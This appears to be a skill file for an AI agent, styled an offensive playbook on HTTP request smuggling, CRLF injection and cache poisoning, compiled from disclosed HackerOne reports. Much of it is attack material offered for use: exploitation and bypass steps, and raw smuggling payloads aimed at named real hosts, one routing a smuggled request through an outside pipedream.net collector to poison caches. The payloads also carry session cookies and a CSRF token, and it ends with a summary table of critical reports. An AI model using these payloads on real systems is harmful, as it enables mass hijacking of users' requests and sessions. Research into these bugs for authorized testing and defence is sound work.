---
name: request-smuggling-desync
description: "HTTP Request Smuggling, CRLF & Cache Poisoning offensive playbook from 86 disclosed HackerOne reports (9 critical, 18 high, 43 medium, 16 low). Use when hunting or reviewing http request smuggling, crlf & cache poisoning. Triggers: request, smuggling, injection, header, allowed."
license: "For authorized security testing and education only."
---

# HTTP Request Smuggling, CRLF & Cache Poisoning

> Distilled from **86** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Inconsistent parsing of request boundaries or CRLF handling between front-end and back-end enables request smuggling, response splitting, header injection, and cache poisoning.

## Where to hunt

- Probe CL.TE/TE.CL/TE.TE discrepancies; look for CRLF-injectable params reflected into headers; test cacheable responses with unkeyed inputs.

## Exploitation playbook

- Smuggle a prefix to poison the next user's request/response; capture victim requests or bypass front-end controls.
- CRLF into headers → response splitting, cookie injection; cache poisoning via unkeyed headers.

## Bypass techniques

- Obfuscated Transfer-Encoding, chunk-size tricks, header casing/whitespace variants.

## Impact & escalation

- Mass victim request hijack, auth bypass at the edge, widespread cache poisoning.

## Remediation

- Normalize/reject ambiguous requests, use HTTP/2 end-to-end, strip CRLF from header values, key caches on all relevant inputs.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#919175](https://hackerone.com/reports/919175)  -  HTTP request smuggling on Basecamp 2 allows web cache poisoning
*critical*

```http
POST /4618984/account HTTP/1.1
Host: basecamp.com
Content-Length: 144
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2…
Transfer-Encoding: chunked
Transfer-encoding: identity

22
_method=patch&account%5Bname%5D=BC
0

GET /x HTTP/1.1
X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
X-Forwarded-Proto: http
Foo: bar
```

### 2. [#919175](https://hackerone.com/reports/919175)  -  HTTP request smuggling on Basecamp 2 allows web cache poisoning
*critical*

```http
POST /4618984/account HTTP/1.1
Host: basecamp.com
Content-Length: 144
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2…
Transfer-Encoding: chunked
Transfer-encoding: identity

22
```

### 3. [#867952](https://hackerone.com/reports/867952)  -  HTTP request Smuggling
*high*

```http
POST /api/sessions HTTP/1.1
Host: console.helium.com
Referer: https://console.helium.com/login
Content-Type: application/json
Content-Length: 109
Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba70…
Transfer-Encoding: chunked

39
{"session":{"email":"fdsfsd@fgd.jk","password":"sdfsdf"}}
00

GET / HTTP/1.1
Host: www.helium.com
foo: x
```

### 4. [#867952](https://hackerone.com/reports/867952)  -  HTTP request Smuggling
*high*

```http
POST /api/sessions HTTP/1.1
Host: console.helium.com
Referer: https://console.helium.com/login
Content-Type: application/json
Content-Length: 109
Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba70…
Transfer-Encoding: chunked

39
```

### 5. [#2327341](https://hackerone.com/reports/2327341)  -  CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side D…
*high, $4,660*

```http
POST / HTTP/1.1
Host: hostname
```

### 6. [#1204695](https://hackerone.com/reports/1204695)  -  RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する
*high*

```bash
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 500 Internal Server Error
Date: Fri, 21 May 2021 00:49:44 GMT
Server: Apache/2.2.31 (Unix)
Location: http://example.jp
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html

<script>alert(1)</script>
```

More payloads: see [payloads.md](payloads.md) (122 curated).

## Recurring patterns in this dataset

Most frequent terms across the 86 reports (term (count)): `request` (82), `smuggling` (69), `injection` (38), `header` (36), `allowed` (30), `server` (29), `response` (29), `crlf` (27), `node.js` (24), `apache` (24), `cache` (23), `llhttp` (23), `attacker` (21), `poisoning` (21), `parser` (19), `parsing` (19), `versions` (18), `headers` (17)

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#1211724](https://hackerone.com/reports/1211724) | critical | $7,500 | basecamp | HTTP Request Smuggling via HTTP/2 |
| [#1200647](https://hackerone.com/reports/1200647) | critical | $5,000 | aiven_ltd | Grafana RCE via SMTP server parameter injection |
| [#737140](https://hackerone.com/reports/737140) | critical |  -  | slack | Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal ses… |
| [#771666](https://hackerone.com/reports/771666) | critical |  -  | eternal | Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com |
| [#735748](https://hackerone.com/reports/735748) | critical |  -  | nodejs | HTTP request smuggling using malformed Transfer-Encoding header |
| [#758445](https://hackerone.com/reports/758445) | critical |  -  | ibb | HTTP Smuggling multiple issues in Squid 3.x & squid 4.x |
| [#919175](https://hackerone.com/reports/919175) | critical |  -  | basecamp | HTTP request smuggling on Basecamp 2 allows web cache poisoning |
| [#867577](https://hackerone.com/reports/867577) | critical |  -  | basecamp | Unauthenticated request smuggling on launchpad.37signals.com |

*See [reference.md](reference.md) for all 86 reports in this class.*
